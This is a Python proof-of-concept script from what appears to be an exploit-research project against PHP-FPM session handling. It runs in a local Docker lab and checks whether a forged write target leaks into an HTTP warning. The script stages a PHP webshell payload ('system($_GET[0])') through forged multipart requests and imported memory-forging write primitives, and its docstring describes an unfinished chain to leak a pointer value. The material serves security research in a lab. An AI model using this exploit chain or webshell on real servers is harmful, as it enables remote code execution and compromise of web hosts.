#!/usr/bin/env python3
"""Verify: the ps_files_open warning discloses the forged `basedir` content to
the HTTP response body, fresh-container-per-trial, black-box.

Aims the existing K-free write finisher's target at a deliberately invalid
path (so the file-write itself fails) and checks the open-failure warning in
the response carries that exact path back. This verifies the DISCLOSURE SITE
only -- not a recovered pointer/K value (that completion is open; see
ps_files_warning_disclosure.py's docstring and fpm-varpush-seat-consume-www
memory).

Lab: profile fpmfire (html_errors=off required -- see lab/fpmfire/pool.conf):
    docker compose -f docker-compose.fpm-avenues.yml --profile fpmfire up -d --build
    # nginx 127.0.0.1:18085
Run:
    python3 -I poc/primitives/read_leak/verify_ps_files_warning_disclosure.py [ntrials]

Measured: 3/3, independently re-verified.
"""
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.write.kfree_staletail_forge import (  # noqa: E402
    BUILD_CONST, arm_parts, build_carrier, session_record, stage_parts)
from primitives.read_leak.ps_files_warning_disclosure import parse_disclosed  # noqa: E402
from common.multipart import multipart_tuple  # noqa: E402

REPO = os.path.dirname(_POC_ROOT)
COMPOSE_FILE = os.path.join(REPO, "docker-compose.fpm-avenues.yml")
BASE = "http://127.0.0.1:18085"
PROFILE = "fpmfire"
CONTAINER = "p2s-fpmfire-fpm"
SID = "sess0000000000000000000000000001"
SF = "/tmp/sess_" + SID
WEBSHELL = b"<?php system($_GET[0]);?>"
TARGET = "/zzz_nope_dir/leak.php"   # deliberately invalid -> open() fails -> warning
BND = b"----l2"


def comp(*a, t=180):
    return subprocess.run(["docker", "compose", "-f", COMPOSE_FILE, "--profile", PROFILE, *a],
                          cwd=REPO, capture_output=True, text=True, timeout=t)


def dx(*c, t=30):
    return subprocess.run(["docker", "exec", CONTAINER, *c], capture_output=True, text=True, timeout=t).stdout


def http(path, data=None, ct=None, t=90, cookie=False):
    req = urllib.request.Request(BASE + path, data=data)
    if ct:
        req.add_header("Content-Type", ct)
    if cookie:
        req.add_header("Cookie", "PHPSESSID=" + SID)
    try:
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return None, repr(e).encode()


def wpid():
    s, b = http("/probe.php", t=8)
    return b.split(b":", 1)[1].decode().strip() if (s == 200 and b.startswith(b"ALIVE:")) else None


def ready():
    for _ in range(80):
        if wpid():
            return True
        time.sleep(0.5)
    return False


def trial(i):
    comp("down", t=90)
    if comp("up", "-d", "--build").returncode != 0 or not ready():
        return f"trial {i}: SKIP (boot)", False
    dx("sh", "-c", f"printf %s '{session_record().decode()}' > {SF}; chown www-data {SF}")
    abody, ah = multipart_tuple(arm_parts(TARGET), BND)
    http("/arm.php", data=abody, ct=ah["Content-Type"])
    carrier, _ = build_carrier(BUILD_CONST)
    sbody, sh = multipart_tuple(stage_parts(carrier, WEBSHELL), BND)
    _, body = http("/echo.php", data=sbody, ct=sh["Content-Type"], cookie=True)
    disclosed = parse_disclosed(body)
    ok = disclosed is not None and disclosed.decode("latin-1") == TARGET
    return f"trial {i}: disclosed={disclosed!r} -> {'PASS' if ok else 'FAIL'}", ok


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 and sys.argv[1].isdigit() else 3
    if subprocess.run(["docker", "version"], capture_output=True).returncode != 0:
        print("SKIP: docker unavailable"); return
    results = []
    for i in range(1, n + 1):
        line, ok = trial(i)
        print(line, flush=True)
        results.append(ok)
    comp("down", t=90)
    npass = sum(results)
    print(f"\n{'PASS' if npass == n else 'FAIL'}: {npass}/{n} disclosed the forged basedir path")


if __name__ == "__main__":
    main()
